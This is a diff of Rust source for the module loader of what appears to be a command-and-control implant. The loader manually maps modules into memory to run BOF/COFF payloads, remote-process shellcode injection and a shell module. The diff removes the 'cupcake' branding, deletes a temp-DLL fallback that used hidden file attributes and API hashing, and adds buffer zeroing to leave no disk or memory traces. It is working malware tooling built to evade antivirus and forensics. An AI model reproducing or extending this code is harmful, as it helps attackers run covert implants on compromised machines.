@@ -1,14 +1,16 @@
 // Stage0 module loader (L2).
 //
 // Pipeline: stage (CKMS bytes) → verify HMAC → load
-//   Classic BOF module (`bof`, cupcake-mod-bof):
-//     Manual-Map in-process (fileless) → mod_invoke("bof_exec") runs COFF in the
-//     agent process. Staged on demand so Stage0 carries no BOF/Beacon signatures.
+//   Classic BOF module (`bof`, ):
+//     Manual-Map in-process (fileless, no temp DLL) → mod_invoke("bof_exec")
+//     runs COFF in the agent process under VEH isolation. Staged on demand so
+//     Stage0 carries no BOF/Beacon signatures. Plugin COFF is wire→memory only
+//     (never written to disk); buffers are burned after execute.
 //   Product worker modules (inject / ad):
 //     register with ModuleSupervisor only — NEVER mapped into Stage0; spawned as
 //     self-contained sacrificial worker EXEs under a Job Object.
-//   Non-product / legacy test modules:
-//     Manual-Map / short disk LoadLibrary → mod_invoke → unload.
+//   Non-product / legacy test modules (Windows):
+//     Manual-Map only (LoadLibrary temp-DLL fallback removed).
 //
 // Isolation: docs/MODULE_WORKER_ISOLATION.md
 // OPSEC: load only on operator demand; unload drops mappings/handles.
@@ -27,7 +29,7 @@ pub const MOD_FS: &str = "fs";
 pub const MOD_PROC: &str = "proc";
 pub const MOD_SOCKS: &str = "socks";
 pub const MOD_PLUGIN: &str = "plugin";
-/// Classic in-process BOF engine (cupcake-mod-bof) — Manual-Map, fileless.
+/// Classic in-process BOF engine () — Manual-Map, fileless.
 pub const MOD_BOF: &str = "bof";
 /// Remote process shellcode inject — L2 only (`modules/inject`, self-contained worker EXE)
 pub const MOD_INJECT: &str = "inject";
@@ -222,7 +224,7 @@ fn module_key() -> [u8; 32] {
         return module_package::default_module_key();
     }
     // Last resort: derive from empty seed so process does not use the static default string.
-    module_package::derive_module_key(b"cupcake-missing-aes-key")
+    module_package::derive_module_key(b"svc-missing-aes-key")
 }
 
 /// Candidate keys for verify — tolerate server/agent historical mismatches.
@@ -319,7 +321,7 @@ impl ModuleRegistry {
     }
 
     pub fn note_required(&self, id: &str) {
-        info!("[module_loader] module required: {}", id);
+        info!("[loader] module required: {}", id);
         if let Ok(mut g) = self.entries.lock() {
             g.entry(id.to_string()).or_insert_with(|| empty_entry(id));
         }
@@ -339,7 +341,7 @@ impl ModuleRegistry {
         e.state = ModuleState::Staged;
         e.payload = None;
         debug!(
-            "[module_loader] staged module {} ({} bytes)",
+            "[loader] staged module {} ({} bytes)",
             id,
             bytes.len()
         );
@@ -404,7 +406,7 @@ impl ModuleRegistry {
         // Legacy in-process .NET runtime retired — operators use shellcode + inject.
         if matches!(
             id,
-            "dotnet" | "mod_dotnet" | "cupcake_mod_dotnet"
+            "dotnet" | "mod_dotnet" | "mod_dotnet"
         ) {
             return Err(format!(
                 "module forbidden: {id} (.NET runtime retired; convert assembly to shellcode and use module inject)"
@@ -431,14 +433,14 @@ impl ModuleRegistry {
                 mod_free: None,
                 mod_shutdown: None,
             });
-            info!("[module_loader] loaded hosted stub module {}", id);
+            info!("[loader] loaded hosted stub module {}", id);
             return Ok(());
         }
 
-        crate::utils::db_print(&format!(
-            "[module_loader] mapping module {id}: {} bytes",
+        crate::db_print!(
+            "[loader] mapping module {id}: {} bytes",
             payload.len()
-        ));
+        );
         let loaded = map_pe_module(&payload).map_err(|e| {
             let mut g = self.entries.lock().ok();
             if let Some(ref mut g) = g {
@@ -448,10 +450,10 @@ impl ModuleRegistry {
             }
             e
         })?;
-        crate::utils::db_print(&format!(
-            "[module_loader] mapped module {id}: base=0x{:X} mem_mapped={}",
+        crate::db_print!(
+            "[loader] mapped module {id}: base=0x{:X} mem_mapped={}",
             loaded.handle, loaded.mem_mapped
-        ));
+        );
 
         // Zeroize PE bytes after map (best-effort; local copy only)
         let mut payload = payload;
@@ -462,9 +464,9 @@ impl ModuleRegistry {
 
         // init entry (x0)
         if let Some(init) = loaded.mod_init {
-            crate::utils::db_print(&format!("[module_loader] calling mod_init (x0) for {id}"));
+            crate::db_print!("[loader] calling mod_init (x0) for {id}");
             let rc = unsafe { init() };
-            crate::utils::db_print(&format!("[module_loader] mod_init rc={} for {id}", rc));
+            crate::db_print!("[loader] mod_init rc={} for {id}", rc);
             if rc != 0 {
                 let _ = unmap_loaded(&loaded);
                 return Err(format!("module init failed rc={rc}"));
@@ -485,7 +487,7 @@ impl ModuleRegistry {
         e.payload = None;
         e.staged = None;
         e.loaded = Some(loaded);
-        info!("[module_loader] loaded module {} via {}", id, via);
+        info!("[loader] loaded module {} via {}", id, via);
         Ok(())
     }
 
@@ -525,7 +527,7 @@ impl ModuleRegistry {
         drop(payload);
         drop(g);
         info!(
-            "[module_loader] product worker {} registered (worker_ready, not mapped)",
+            "[loader] product worker {} registered (worker_ready, not mapped)",
             id
         );
         Ok(())
@@ -638,7 +640,7 @@ impl ModuleRegistry {
             e.state = ModuleState::Absent;
             e.staged = None;
             e.payload = None;
-            info!("[module_loader] unloaded {}", id);
+            info!("[loader] unloaded {}", id);
         }
         Ok(())
     }
@@ -708,178 +710,31 @@ fn map_pe_module(pe: &[u8]) -> Result<LoadedModule, String> {
     }
 }
 
-#[cfg(all(windows, feature = "mem-map"))]
-fn map_pe_windows(pe: &[u8]) -> Result<LoadedModule, String> {
-    if crate::pe_map::mem_map_enabled() {
-        match crate::pe_map::map_pe(pe) {
-            Ok(m) => {
-                return Ok(LoadedModule {
-                    handle: m.base,
-                    mapped_size: m.size,
-                    mem_mapped: true,
-                    dll_main_called: m.dll_main_called,
-                    temp_path: None,
-                    mod_init: m.mod_init,
-                    mod_invoke: m.mod_invoke,
-                    mod_free: m.mod_free,
-                    mod_shutdown: m.mod_shutdown,
-                });
-            }
-            Err(e) => {
-                if crate::pe_map::mem_map_strict() {
-                    return Err(format!("mem-map strict: {e}"));
-                }
-                log::warn!("[module_loader] mem-map failed, fallback LoadLibrary: {e}");
-                crate::utils::db_print(&format!(
-                    "[module_loader] mem-map failed, fallback LoadLibrary: {e}"
-                ));
-            }
-        }
-    }
-    map_pe_windows_loadlibrary(pe)
-}
-
-#[cfg(all(windows, not(feature = "mem-map")))]
-fn map_pe_windows(pe: &[u8]) -> Result<LoadedModule, String> {
-    map_pe_windows_loadlibrary(pe)
-}
-
-/// Write PE to short-lived temp path, LoadLibrary, resolve exports, delete file.
+/// Windows PE mapping — **Manual-Map only** (fileless). The LoadLibrary fallback
+/// path was removed: it wrote a temp DLL to disk (`~DF*.dll`), an OPSEC
+/// residual we no longer tolerate. If Manual-Map fails the module is rejected —
+/// fail-closed, zero disk.
 #[cfg(windows)]
-fn map_pe_windows_loadlibrary(pe: &[u8]) -> Result<LoadedModule, String> {
-    use std::ffi::OsStr;
-    use std::os::windows::ffi::OsStrExt;
-
-    // Space out image-load events (burst LoadLibrary is a common AV tripwire)
-    crate::utils::opsec_heavy_pace();
-
-    let mut path = crate::utils::opsec_staging_dir();
-    let _ = std::fs::create_dir_all(&path);
-    // Neutral cache-like name (avoid cpx_/product prefixes)
-    path.push(crate::utils::opsec_stage_name("dll"));
-
-    std::fs::write(&path, pe).map_err(|e| format!("write temp module: {e}"))?;
-    // Best-effort hide + temporary attribute
-    {
-        let wide: Vec<u16> = path.as_os_str().encode_wide().chain(Some(0)).collect();
-        unsafe {
-            type SetFileAttributesWFn = unsafe extern "system" fn(*const u16, u32) -> i32;
-            let k32 =
-                crate::stealth::get_module_base(crate::stealth::hash_module_name(b"kernel32.dll"));
-            if let Some(addr) = crate::stealth::get_api_addr(
-                k32,
-                crate::stealth::hash_api_name(b"SetFileAttributesW"),
-            ) {
-                let f: SetFileAttributesWFn = std::mem::transmute(addr);
-                let _ = f(wide.as_ptr(), 0x0000_0102); // HIDDEN | TEMPORARY
-            }
-        }
+fn map_pe_windows(pe: &[u8]) -> Result<LoadedModule, String> {
+    if !crate::pe_img::mem_map_enabled() {
+        return Err("map unavailable".into());
     }
-
-    type LoadLibraryWFn = unsafe extern "system" fn(*const u16) -> *mut core::ffi::c_void;
-    type GetProcAddressFn =
-        unsafe extern "system" fn(*mut core::ffi::c_void, *const i8) -> *mut core::ffi::c_void;
-    type FreeLibraryFn = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;
-
-    let (load_lib, get_proc, free_lib) = unsafe {
-        let k32 =
-            crate::stealth::get_module_base(crate::stealth::hash_module_name(b"kernel32.dll"));
-        if k32 == 0 {
-            let _ = std::fs::remove_file(&path);
-            return Err("kernel32 not found".into());
-        }
-        let ll = crate::stealth::get_api_addr(k32, crate::stealth::hash_api_name(b"LoadLibraryW"))
-            .ok_or_else(|| {
-                let _ = std::fs::remove_file(&path);
-                "LoadLibraryW missing".to_string()
-            })?;
-        let gp =
-            crate::stealth::get_api_addr(k32, crate::stealth::hash_api_name(b"GetProcAddress"))
-                .ok_or_else(|| {
-                    let _ = std::fs::remove_file(&path);
-                    "GetProcAddress missing".to_string()
-                })?;
-        let fl = crate::stealth::get_api_addr(k32, crate::stealth::hash_api_name(b"FreeLibrary"))
-            .ok_or_else(|| {
-            let _ = std::fs::remove_file(&path);
-            "FreeLibrary missing".to_string()
-        })?;
-        (
-            std::mem::transmute::<usize, LoadLibraryWFn>(ll),
-            std::mem::transmute::<usize, GetProcAddressFn>(gp),
-            std::mem::transmute::<usize, FreeLibraryFn>(fl),
-        )
-    };
-
-    let wide: Vec<u16> = OsStr::new(&path)
-        .encode_wide()
-        .chain(std::iter::once(0))
-        .collect();
-    // OPSEC: brief stack noise before LoadLibrary (heavy modules)
-    #[cfg(all(windows, target_arch = "x86_64"))]
-    {
-        crate::stealth::stack::add_stack_noise();
+    match crate::pe_img::map_pe(pe) {
+        Ok(m) => Ok(LoadedModule {
+            handle: m.base,
+            mapped_size: m.size,
+            mem_mapped: true,
+            dll_main_called: m.dll_main_called,
+            temp_path: None,
+            mod_init: m.mod_init,
+            mod_invoke: m.mod_invoke,
+            mod_free: m.mod_free,
+            mod_shutdown: m.mod_shutdown,
+        }),
+        Err(e) => Err(format!("map failed: {e}")),
     }
-
-    let handle = unsafe { load_lib(wide.as_ptr()) };
-    // Delete on disk ASAP (mapping retained by loader) — reduce on-disk dwell
-    let _ = std::fs::remove_file(&path);
-    // Best-effort overwrite empty if file reappeared (rare)
-    let _ = std::fs::write(&path, b"");
-    let _ = std::fs::remove_file(&path);
-
-    if handle.is_null() {
-        return Err("LoadLibraryW failed".into());
-    }
-
-    unsafe fn resolve(
-        get_proc: GetProcAddressFn,
-        handle: *mut core::ffi::c_void,
-        name: &[u8],
-    ) -> Option<usize> {
-        let mut buf = Vec::with_capacity(name.len() + 1);
-        buf.extend_from_slice(name);
-        buf.push(0);
-        let p = get_proc(handle, buf.as_ptr() as *const i8);
-        if p.is_null() {
-            None
-        } else {
-            Some(p as usize)
-        }
-    }
-
-    // Neutral ABI names: x0=init, x1=invoke, x2=free, x3=shutdown (see modules/bof).
-    let mod_init =
-        unsafe { resolve(get_proc, handle, b"x0").map(|a| std::mem::transmute(a)) };
-    let mod_invoke =
-        unsafe { resolve(get_proc, handle, b"x1").map(|a| std::mem::transmute(a)) };
-    let mod_free =
-        unsafe { resolve(get_proc, handle, b"x2").map(|a| std::mem::transmute(a)) };
-    let mod_shutdown =
-        unsafe { resolve(get_proc, handle, b"x3").map(|a| std::mem::transmute(a)) };
-
-    if mod_invoke.is_none() {
-        unsafe {
-            free_lib(handle);
-        }
-        return Err("required export missing".into());
-    }
-
-    // Keep free_lib via handle; FreeLibrary on unload
-    let _ = free_lib; // silence if unused path
-
-    Ok(LoadedModule {
-        handle: handle as usize,
-        mapped_size: 0,
-        mem_mapped: false,
-        dll_main_called: false,
-        temp_path: Some(path), // may already be deleted
-        mod_init,
-        mod_invoke,
-        mod_free,
-        mod_shutdown,
-    })
 }
+
 
 #[cfg(not(windows))]
 fn map_pe_unix(pe: &[u8]) -> Result<LoadedModule, String> {
@@ -946,24 +801,13 @@ fn unmap_loaded(loaded: &LoadedModule) -> Result<(), String> {
     }
     #[cfg(all(windows, feature = "mem-map"))]
     if loaded.mem_mapped {
-        crate::pe_map::unmap_image(loaded.handle, loaded.mapped_size, loaded.dll_main_called);
+        crate::pe_img::unmap_image(loaded.handle, loaded.mapped_size, loaded.dll_main_called);
         return Ok(());
     }
+    // Windows: only Manual-Map modules exist (LoadLibrary removed).
     #[cfg(windows)]
-    {
-        type FreeLibraryFn = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;
-        unsafe {
-            let k32 =
-                crate::stealth::get_module_base(crate::stealth::hash_module_name(b"kernel32.dll"));
-            if k32 != 0 {
-                if let Some(addr) =
-                    crate::stealth::get_api_addr(k32, crate::stealth::hash_api_name(b"FreeLibrary"))
-                {
-                    let free_lib: FreeLibraryFn = std::mem::transmute(addr);
-                    free_lib(loaded.handle as *mut core::ffi::c_void);
-                }
-            }
-        }
+    if !loaded.mem_mapped {
+        return Err("map state invalid".to_string());
     }
     #[cfg(not(windows))]
     {
@@ -1029,7 +873,7 @@ pub fn invoke_shell(command: &str) -> Result<CommandResult, String> {
 
 /// Invoke loaded `bof` module with base64 COFF + optional base64 args (JSON envelope).
 /// Classic BOF path: COFF executes **in the agent process** via mod_bof (Manual-Mapped,
-/// fileless, no sacrificial process).
+/// fileless, no sacrificial process, no temp file). Envelope JSON is zeroized after invoke.
 pub fn invoke_bof(coff: &[u8], args: &[u8]) -> Result<CommandResult, String> {
     ensure_module_for_command("bof_exec")?;
     let data_b64 = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, coff);
@@ -1038,8 +882,13 @@ pub fn invoke_bof(coff: &[u8], args: &[u8]) -> Result<CommandResult, String> {
         "data": data_b64,
         "args": args_b64,
     });
-    let bytes = serde_json::to_vec(&payload).map_err(|e| e.to_string())?;
-    registry().invoke(MOD_BOF, "bof_exec", &bytes)
+    let mut bytes = serde_json::to_vec(&payload).map_err(|e| e.to_string())?;
+    let result = registry().invoke(MOD_BOF, "bof_exec", &bytes);
+    // Burn wire envelope (base64 COFF copy) — fileless residual reduction.
+    for b in bytes.iter_mut() {
+        *b = 0;
+    }
+    result
 }
 
 /// Invoke inject via **inject worker process** (self-contained worker EXE).
@@ -1193,32 +1042,32 @@ mod tests {
         assert!(ms <= 7_200_000);
     }
 
-    /// Optional PE load: set CUPCAKE_TEST_MOD_SHELL to path of cupcake_mod_shell.dll
-    /// Uses LoadLibrary path (APP_MEM_MAP=0) so CRT/TLS is handled by OS loader.
+    /// Optional PE load: set TEST_MOD_SHELL to path of mod_shell.dll
+    /// Uses LoadLibrary path (SVC_IMG_MAP=0) so CRT/TLS is handled by OS loader.
     /// Isolated: clears strict env; always unload + clear key even on failure mid-test.
     #[test]
     fn load_real_shell_dll_if_present() {
         let _g = test_lock();
         // Isolate from other tests that toggle mem-map flags
-        std::env::remove_var("APP_MEM_MAP_STRICT");
-        std::env::set_var("APP_MEM_MAP", "0");
-        let path = match std::env::var("CUPCAKE_TEST_MOD_SHELL") {
+        std::env::remove_var("SVC_IMG_MAP_STRICT");
+        std::env::set_var("SVC_IMG_MAP", "0");
+        let path = match std::env::var("TEST_MOD_SHELL") {
             Ok(p) if !p.is_empty() => p,
             _ => {
                 let candidates = [
                     PathBuf::from(env!("CARGO_MANIFEST_DIR"))
-                        .join("../target/release/cupcake_mod_shell.dll"),
+                        .join("../target/release/mod_shell.dll"),
                     PathBuf::from(env!("CARGO_MANIFEST_DIR"))
-                        .join("../../Client/target/release/cupcake_mod_shell.dll"),
-                    PathBuf::from("../target/release/cupcake_mod_shell.dll"),
-                    PathBuf::from("target/release/cupcake_mod_shell.dll"),
+                        .join("../../Client/target/release/mod_shell.dll"),
+                    PathBuf::from("../target/release/mod_shell.dll"),
+                    PathBuf::from("target/release/mod_shell.dll"),
                 ];
                 let found = candidates.into_iter().find(|p| p.is_file());
                 match found {
                     Some(p) => p.to_string_lossy().into_owned(),
                     None => {
-                        eprintln!("skip: no mod_shell dll (set CUPCAKE_TEST_MOD_SHELL)");
-                        std::env::remove_var("APP_MEM_MAP");
+                        eprintln!("skip: no mod_shell dll (set TEST_MOD_SHELL)");
+                        std::env::remove_var("SVC_IMG_MAP");
                         return;
                     }
                 }
@@ -1228,13 +1077,13 @@ mod tests {
             Ok(b) => b,
             Err(e) => {
                 eprintln!("skip read {path}: {e}");
-                std::env::remove_var("APP_MEM_MAP");
+                std::env::remove_var("SVC_IMG_MAP");
                 return;
             }
         };
         if pe.len() < 64 || pe[0] != b'M' {
             eprintln!("skip: not PE");
-            std::env::remove_var("APP_MEM_MAP");
+            std::env::remove_var("SVC_IMG_MAP");
             return;
         }
         let key = default_module_key();
@@ -1248,7 +1097,7 @@ mod tests {
         if let Err(e) = load_res {
             let _ = registry().unload(id);
             registry().set_key_override(None);
-            std::env::remove_var("APP_MEM_MAP");
+            std::env::remove_var("SVC_IMG_MAP");
             panic!("load PE module failed: {e}");
         }
         assert!(registry().is_loaded(id));
@@ -1267,10 +1116,10 @@ mod tests {
             r.stderr
         );
         let r2 = registry()
-            .invoke(id, "shell", b"echo cupcake_mod_shell_ok")
+            .invoke(id, "shell", b"echo mod_shell_ok")
             .expect("invoke echo");
         assert!(
-            r2.stdout.contains("cupcake_mod_shell_ok"),
+            r2.stdout.contains("mod_shell_ok"),
             "echo builtin must echo marker; stdout={:?} stderr={:?}",
             r2.stdout,
             r2.stderr
@@ -1278,7 +1127,7 @@ mod tests {
         registry().unload(id).expect("unload");
         assert!(!registry().is_loaded(id));
         registry().set_key_override(None);
-        std::env::remove_var("APP_MEM_MAP");
+        std::env::remove_var("SVC_IMG_MAP");
         eprintln!("OK real PE load+invoke(help+echo)+unload via {path} load_mode={mode}");
     }
 
@@ -1324,8 +1173,8 @@ mod tests {
         let _g = test_lock();
         #[cfg(all(windows, feature = "mem-map"))]
         {
-            std::env::set_var("APP_MEM_MAP_STRICT", "1");
-            std::env::set_var("APP_MEM_MAP", "1");
+            std::env::set_var("SVC_IMG_MAP_STRICT", "1");
+            std::env::set_var("SVC_IMG_MAP", "1");
             let tmp = std::env::temp_dir();
             let before: std::collections::HashSet<_> = std::fs::read_dir(&tmp)
                 .into_iter()
@@ -1404,12 +1253,12 @@ mod tests {
             );
 
             registry().set_key_override(None);
-            std::env::remove_var("APP_MEM_MAP_STRICT");
+            std::env::remove_var("SVC_IMG_MAP_STRICT");
         }
     }
 
     fn find_product_l2_pe() -> Option<PathBuf> {
-        if let Ok(p) = std::env::var("CUPCAKE_TEST_MOD_PE") {
+        if let Ok(p) = std::env::var("TEST_MOD_PE") {
             let pb = PathBuf::from(p);
             if pb.is_file() {
                 return Some(pb);
@@ -1419,7 +1268,7 @@ mod tests {
         [
             root.join("../../server/storage/modules/bof.bin"),
             root.join("../target/release/app_rt.dll"),
-            root.join("../target/release/cupcake_mod_bof.dll"),
+            root.join("../target/release/mod_bof.dll"),
             PathBuf::from("server/storage/modules/bof.bin"),
         ]
         .into_iter()
@@ -1430,10 +1279,10 @@ mod tests {
     #[test]
     fn stage_product_bin_from_storage_if_present() {
         let _g = test_lock();
-        std::env::remove_var("APP_MEM_MAP_STRICT");
-        std::env::remove_var("APP_MEM_MAP");
+        std::env::remove_var("SVC_IMG_MAP_STRICT");
+        std::env::remove_var("SVC_IMG_MAP");
         let Some(path) = find_product_l2_pe() else {
-            eprintln!("skip: no product L2 PE (inject); set CUPCAKE_TEST_MOD_PE");
+            eprintln!("skip: no product L2 PE (inject); set TEST_MOD_PE");
             return;
         };
         let pe = std::fs::read(&path).expect("read product pe");
@@ -1515,9 +1364,9 @@ mod tests {
                     }
                 })
                 .collect();
-            let m = crate::pe_map::map_pe_opts(&pe, false).expect("pe_map success path");
+            let m = crate::pe_img::map_pe_opts(&pe, false).expect("pe_map success path");
             assert!(m.mod_invoke.is_some());
-            crate::pe_map::unmap_pe(&m);
+            crate::pe_img::unmap_pe(&m);
             let after: std::collections::HashSet<_> = std::fs::read_dir(&tmp)
                 .into_iter()
                 .flatten()
